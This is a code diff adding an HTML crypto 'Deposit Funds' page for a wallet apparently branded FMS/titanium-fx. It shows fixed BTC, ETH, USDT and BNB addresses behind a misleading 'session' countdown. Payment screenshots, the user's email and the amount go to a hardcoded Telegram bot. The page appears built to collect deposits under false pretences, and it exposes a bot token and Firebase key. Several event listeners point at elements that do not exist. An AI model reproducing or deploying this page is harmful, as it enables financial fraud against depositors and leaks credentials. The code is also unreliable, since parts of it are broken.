@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Deposit - UI Wallet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet"/>
+  
+  <!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '09886095a5987ea5673fadbf440836e647989737';
+window.smartsupp||(function(d) {
+	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+	s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+	c.type='text/javascript';c.charset='utf-8';c.async=true;
+	c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+  <link rel="icon" href="logo.png" />
+    <style>
+  body {
+    background-color: #f8fafc;
+    color: #1e293b;
+    font-family: 'Segoe UI', sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    mini-height: 100vh;
+    padding: 20px;
+    position: relative;
+    overflow-x: hidden;
+    overflow-y: auto;
+    user-select: none;
+    -webkit-user-drag: none;
+    -webkit-touch-callout: none;
+  }
+
+  .back-btn {
+    position: absolute;
+    top: 20px;
+    left: 20px;
+    background: #e2e8f0;
+    color: #1e293b;
+    border: none;
+    padding: 10px 16px;
+    border-radius: 10px;
+    font-size: 14px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    transition: background 0.3s ease;
+    z-index: 100;
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
+  }
+
+  .back-btn:hover {
+    background: #cbd5e1;
+  }
+
+  .deposit-box {
+    background: #ffffff;
+    padding: 30px;
+    border-radius: 20px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
+    width: 100%;
+    max-width: 420px;
+    animation: fadeSlideIn 0.6s ease forwards;
+    opacity: 0;
+    transform: translateY(30px);
+  }
+
+  @keyframes fadeSlideIn {
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .deposit-box h2 {
+    text-align: center;
+    margin-bottom: 20px;
+    color: #0f172a;
+    font-size: 22px;
+    font-weight: 600;
+  }
+
+  .form-control {
+    margin-bottom: 15px;
+  }
+
+  .form-control input,
+  .form-control select {
+    width: 100%;
+    padding: 12px;
+    border-radius: 12px;
+    border: 1px solid #e2e8f0;
+    background: #f1f5f9;
+    color: #1e293b;
+    font-size: 15px;
+    outline: none;
+    transition: border-color 0.3s ease;
+  }
+
+  .form-control input:focus,
+  .form-control select:focus {
+    border-color: #3b82f6;
+  }
+
+  .qr-code {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 20px;
+  }
+
+  .qr-code img {
+    width: 180px;
+    height: 180px;
+    border-radius: 16px;
+    border: 4px solid #e2e8f0;
+    background: #f1f5f9;
+  }
+
+  .wallet-address {
+    background: #f1f5f9;
+    padding: 12px;
+    border-radius: 12px;
+    border: 1px solid #e2e8f0;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 14px;
+    color: #334155;
+    margin-bottom: 12px;
+  }
+
+  .wallet-address code {
+    word-break: break-word;
+    font-family: monospace;
+  }
+
+  .copy-btn {
+    background: #3b82f6;
+    color: #ffffff;
+    border: none;
+    padding: 8px 12px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 14px;
+    position: relative;
+    transition: background 0.3s ease;
+  }
+
+  .copy-btn:hover {
+    background: #2563eb;
+  }
+
+  .copy-btn::after {
+    content: "Copy to clipboard";
+    position: absolute;
+    bottom: -26px;
+    left: 0;
+    background: #1e293b;
+    color: #f1f5f9;
+    padding: 4px 8px;
+    font-size: 12px;
+    border-radius: 6px;
+    opacity: 0;
+    transition: opacity 0.3s;
+    pointer-events: none;
+    white-space: nowrap;
+  }
+
+  .copy-btn:hover::after {
+    opacity: 1;
+  }
+
+  .copied-text {
+    font-size: 12px;
+    color: #22c55e;
+    text-align: right;
+    margin-bottom: 10px;
+    display: none;
+  }
+
+  .note {
+    text-align: center;
+    font-size: 13px;
+    color: #64748b;
+    margin-top: 10px;
+  }
+
+  .estimate {
+    font-size: 14px;
+    margin-top: 10px;
+    text-align: center;
+    color: #3b82f6;
+  }
+
+  .timer {
+    text-align: center;
+    font-size: 14px;
+    margin-top: 12px;
+    color: #fbbf24;
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    background: #ffffff;
+    color: #1e293b;
+    padding: 12px 18px;
+    border-radius: 12px;
+    border: 1px solid #e2e8f0;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.06);
+    opacity: 0;
+    transform: translateY(20px);
+    transition: all 0.4s ease;
+    z-index: 9999;
+    font-size: 14px;
+  }
+
+  .toast.show {
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  .tap-animate {
+    transition: transform 0.1s ease;
+  }
+
+  .tap-animate:active {
+    transform: scale(0.96);
+  }
+
+  @media (max-width: 480px) {
+    .deposit-box {
+      padding: 20px;
+    }
+
+    .qr-code img {
+      width: 140px;
+      height: 140px;
+    }
+  }
+</style>
+</html>
+<body>
+  
+  <!-- Universal Loader -->
+<div id="loader">
+  <div class="loader-container">
+    <div class="loader-logo">FMS</div>
+    <div class="spinner-ring"></div>
+  </div>
+</div>
+
+<style>
+  /* Loader Styles */
+  #loader {
+    background: #f8fafc;
+    height: 100vh;
+    width: 100vw;
+    position: fixed;
+    top: 0;
+    left: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    opacity: 1;
+    transition: opacity 0.5s ease;
+  }
+
+  .loader-container {
+    position: relative;
+    width: 240px;
+    height: 240px;
+  }
+
+  .loader-logo {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 72px;
+    font-weight: bold;
+    color: #3b82f6;
+    user-select: none;
+    white-space: nowrap;
+    z-index: 2;
+    animation: scalePulse 2s infinite ease-in-out;
+  }
+
+  .spinner-ring {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 240px;
+    height: 240px;
+    border: 5px solid transparent;
+    border-left: 5px solid #3b82f6;
+    border-bottom: 5px solid rgba(59, 130, 246, 0.6);
+    border-right: 5px solid rgba(59, 130, 246, 0.3);
+    border-top: 5px solid transparent;
+    border-radius: 50%;
+    animation: spin 2s linear infinite;
+    z-index: 1;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  @keyframes scalePulse {
+    0%, 100% {
+      transform: translate(-50%, -50%) scale(1);
+    }
+    50% {
+      transform: translate(-50%, -50%) scale(1.2);
+    }
+  }
+</style>
+
+<script>
+  // Loader hides after 1.5 seconds with fade-out
+  window.addEventListener("load", () => {
+    setTimeout(() => {
+      const loader = document.getElementById("loader");
+      loader.style.opacity = "0";
+      setTimeout(() => {
+        loader.style.display = "none";
+      }, 500); // match fade transition
+    }, 1500);
+  });
+</script>
+  <button class="back-btn" onclick="window.history.back()">
+    <i class="fa-solid fa-arrow-left"></i> Back
+  </button>
+
+  <div class="deposit-box">
+    <h2>Deposit Funds</h2>
+
+    <div class="form-control">
+<label for="crypto">Select Cryptocurrency:</label>
+<select id="crypto" onchange="updateNetworks(); estimateCrypto();">
+  <option value="usdt">USDT</option>
+  <option value="btc">Bitcoin</option>
+  <option value="eth">Ethereum</option>
+  <option value="bnb">Binance Coin</option>
+</select>
+
+<label for="network">Select Network:</label>
+<select id="network" onchange="estimateCrypto()"></select>
+
+<p id="estimateDisplay">Estimated: --</p>
+    </div>
+
+    <div class="form-control">
+      <input type="number" id="usdAmount" placeholder="Enter USD amount" oninput="estimateCrypto()">
+    </div>
+
+    <div class="estimate" id="estimateDisplay">Estimated: --</div>
+
+    <div class="qr-code">
+      <img id="qrImage" src="" alt="QR Code">
+    </div>
+<!-- Add this right after the QR image -->
+<div class="qr-code" style="margin-top:-10px;">
+  <img id="cryptoLogo" src="" alt="Crypto Logo"
+       style="width:40px; height:40px; border:none; margin-top:10px;" />
+</div>
+    <div class="wallet-address">
+      <code id="walletAddress"></code>
+      <button class="copy-btn" onclick="copyAddress()">Copy</button>
+    </div>
+
+    <div class="copied-text" id="copiedText">Address copied!</div>
+
+    <div class="timer" id="timerBox">Session valid for: 15:00</div>
+
+    <div class="form-control">
+      <input type="file" id="proofInput" accept="image/*" style="display:none;" onchange="sendProof(this.files[0])"/>
+      <button class="copy-btn" style="width:100%;" onclick="document.getElementById('proofInput').click()">Upload Payment Proof</button>
+    </div>
+
+    <p class="note">Make sure to upload a clear screenshot after sending funds.</p>
+    <p class="note">Send only the selected crypto to this address. Your balance updates after confirmation.</p>
+  </div>
+
+  <div id="toast" class="toast">Sending Proof...</div>
+
+  <audio id="uploadSound" src="https://www.soundjay.com/button/sounds/button-16.mp3" preload="auto"></audio>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+  <script>
+const firebaseConfig = {
+    apiKey: "AIzaSyB89FVW7DW8xdASCAyNsTN71zK5p_YMSVk",
+    authDomain: "titanium-fx.firebaseapp.com",
+    projectId: "titanium-fx",
+    storageBucket: "titanium-fx.appspot.com",
+    messagingSenderId: "623119248603",
+    appId: "1:623119248603:web:824489ee0033bef9bdf0fe"
+  };
+    firebase.initializeApp(firebaseConfig);
+  </script>
+
+<script>
+  const cryptoNetworks = {
+    usdt: ["trc20"],
+    btc: ["bitcoin"],
+    eth: ["ethereum"],
+    bnb: ["bep20"]
+  };
+
+  const fullAddresses = {
+    usdt_trc20: "TKvCvgmWswRbj449THnXjJJyQfzBjZNoaf",
+    btc_bitcoin: "bc1qzyx6uqhgvguk6cj5p6k6pp82uf79sxa5daf630",
+    eth_ethereum: "0x7b91dC9DE768c07E37374020036Cff8148a55788",
+    bnb_bep20: "0x7b91dC9DE768c07E37374020036Cff8148a55788"
+  };
+
+  const logos = {
+    usdt: "https://img.icons8.com/?size=100&id=DEDR1BLPBScO&format=png&color=000000",
+    usdc: "https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png",
+    btc: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png",
+    eth: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
+    sol: "https://assets.coingecko.com/coins/images/4128/large/solana.png",
+    xrp: "https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png",
+    ton: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ton/info/logo.png",
+    bnb: "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png"
+  };
+
+  let cryptoRates = {};
+
+  async function fetchRates() {
+    try {
+      const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,tether,usd-coin,ethereum,solana,ripple,the-open-network,binancecoin&vs_currencies=usd");
+      const data = await res.json();
+
+      cryptoRates = {
+        usdt_trc20: 1,
+        usdt_erc20: 1,
+        usdt_bep20: 1,
+        usdc_erc20: 1,
+        usdc_trc20: 1,
+        btc_bitcoin: 1 / data.bitcoin.usd,
+        eth_ethereum: 1 / data.ethereum.usd,
+        sol_solana: 1 / data.solana.usd,
+        xrp_ripple: 1 / data.ripple.usd,
+        ton_ton: 1 / data["the-open-network"].usd,
+        bnb_bep20: 1 / data.binancecoin.usd
+      };
+
+      estimateCrypto();
+    } catch (error) {
+      console.error("Rate fetch error:", error);
+      document.getElementById("estimateDisplay").textContent = "Live price unavailable";
+    }
+  }
+
+  function updateNetworks() {
+    const crypto = document.getElementById("crypto").value;
+    const networkSelect = document.getElementById("network");
+    networkSelect.innerHTML = "";
+
+    cryptoNetworks[crypto].forEach(net => {
+      const opt = document.createElement("option");
+      opt.value = net;
+      opt.textContent = net.toUpperCase();
+      networkSelect.appendChild(opt);
+    });
+
+    updateDepositInfo();
+  }
+
+  function updateDepositInfo() {
+    const crypto = document.getElementById("crypto").value;
+    const network = document.getElementById("network").value;
+    const key = `${crypto}_${network}`;
+    const address = fullAddresses[key] || "N/A";
+
+    document.getElementById("walletAddress").textContent = address;
+    document.getElementById("qrImage").src = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(address)}&size=180x180`;
+    document.getElementById("cryptoLogo").src = logos[crypto];
+
+    estimateCrypto();
+  }
+
+  function estimateCrypto() {
+    const usd = parseFloat(document.getElementById("usdAmount").value) || 0;
+    const crypto = document.getElementById("crypto").value;
+    const network = document.getElementById("network").value;
+    const rate = cryptoRates[`${crypto}_${network}`] || 0;
+    const estimated = usd * rate;
+
+    document.getElementById("estimateDisplay").textContent =
+      usd && rate ? `Estimated: ${estimated.toFixed(6)} ${crypto.toUpperCase()}` : "Estimated: --";
+  }
+
+  function copyAddress() {
+    const address = document.getElementById("walletAddress").textContent;
+    navigator.clipboard.writeText(address).then(() => {
+      const copiedText = document.getElementById("copiedText");
+      copiedText.style.display = "block";
+      setTimeout(() => copiedText.style.display = "none", 1500);
+    });
+  }
+
+  function startTimer() {
+    let seconds = 15 * 60;
+    const timerEl = document.getElementById("timerBox");
+
+    function update() {
+      const m = Math.floor(seconds / 60).toString().padStart(2, '0');
+      const s = (seconds % 60).toString().padStart(2, '0');
+      timerEl.textContent = `Session valid for: ${m}:${s}`;
+      if (seconds > 0) {
+        seconds--;
+        setTimeout(update, 1000);
+      } else {
+        timerEl.textContent = "Session expired. Refresh to get new address.";
+      }
+    }
+
+    update();
+  }
+
+  function showToast(message) {
+    const toast = document.getElementById("toast");
+    toast.textContent = message;
+    toast.classList.add("show");
+    setTimeout(() => toast.classList.remove("show"), 3000);
+  }
+
+  async function sendProof(file) {
+    if (!file) return;
+
+    const usdAmount = document.getElementById("usdAmount").value || "N/A";
+    const crypto = document.getElementById("crypto").value;
+    const network = document.getElementById("network").value;
+    const wallet = document.getElementById("walletAddress").textContent;
+
+    firebase.auth().onAuthStateChanged(async function(user) {
+      const email = user ? user.email : "Unauthenticated";
+
+      const docRef = await firebase.firestore().collection("deposits").add({
+        email,
+        amount: usdAmount,
+        crypto,
+        network,
+        wallet,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
+
+      const transactionId = docRef.id;
+      const caption = `💰 *New Deposit Proof*\n📧 *Email:* ${email}\n💵 *Amount:* $${usdAmount}\n🔐 *Crypto:* ${crypto.toUpperCase()} (${network.toUpperCase()})\n📥 *Wallet:* ${wallet}\n🆔 *TX ID:* ${transactionId}`;
+      const botToken = "7208063339:AAHD1oN5lhJkXinAonqbzYasJdgmEH1MHNk"; // Replace with your Telegram Bot Token
+      const chatId = "7710943481"; // Replace with your Telegram Chat ID
+      const sound = document.getElementById("uploadSound");
+
+      showToast("Uploading in 3 seconds...");
+
+      setTimeout(() => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("caption", caption);
+        formData.append("photo", file);
+        formData.append("parse_mode", "Markdown");
+
+        if(sound) sound.play();
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        })
+        .then(res => res.json())
+
+.then(data => {
+  showToast("Proof sent successfully.");
+
+  // Delay so the user sees the success message
+  setTimeout(() => {
+    const encodedAmount = encodeURIComponent(usdAmount);
+    const encodedCrypto = encodeURIComponent(crypto);
+
+    // Build redirect URL with query parameters
+    let redirectURL = "";
+
+    switch (crypto) {
+      case "btc":
+        redirectURL = `/success-bitcoin.html?amount=${encodedAmount}&crypto=${encodedCrypto}`;
+        break;
+      case "eth":
+        redirectURL = `/success-ethereum.html?amount=${encodedAmount}&crypto=${encodedCrypto}`;
+        break;
+      case "usdt":
+        redirectURL = `/success-usdt.html?amount=${encodedAmount}&crypto=${encodedCrypto}`;
+        break;
+      case "bnb":
+        redirectURL = `/success-bnb.html?amount=${encodedAmount}&crypto=${encodedCrypto}`;
+        break;
+      case "sol":
+        redirectURL = `/success-solana.html?amount=${encodedAmount}&crypto=${encodedCrypto}`;
+        break;
+      case "xrp":
+        redirectURL = `/success-xrp.html?amount=${encodedAmount}&crypto=${encodedCrypto}`;
+        break;
+      case "ton":
+        redirectURL = `/success-ton.html?amount=${encodedAmount}&crypto=${encodedCrypto}`;
+        break;
+      case "usdc":
+        redirectURL = `/success-usdc.html?amount=${encodedAmount}&crypto=${encodedCrypto}`;
+        break;
+      default:
+        redirectURL = `/success.html?amount=${encodedAmount}&crypto=${encodedCrypto}`;
+    }
+
+    window.location.href = redirectURL;
+  }, 2000);
+})
+        .catch(err => {
+          console.error(err);
+          showToast("Failed to send proof.");
+        });
+      }, 3000);
+    });
+  }
+
+  window.addEventListener("load", () => {
+    updateNetworks();
+    fetchRates();
+    startTimer();
+
+    document.getElementById("crypto").addEventListener("change", updateNetworks);
+    document.getElementById("network").addEventListener("change", updateDepositInfo);
+    document.getElementById("usdAmount").addEventListener("input", estimateCrypto);
+    document.getElementById("copyBtn").addEventListener("click", copyAddress);
+    document.getElementById("proofUpload").addEventListener("change", e => {
+      sendProof(e.target.files[0]);
+    });
+  });
+</script>
+</body>
+</html>
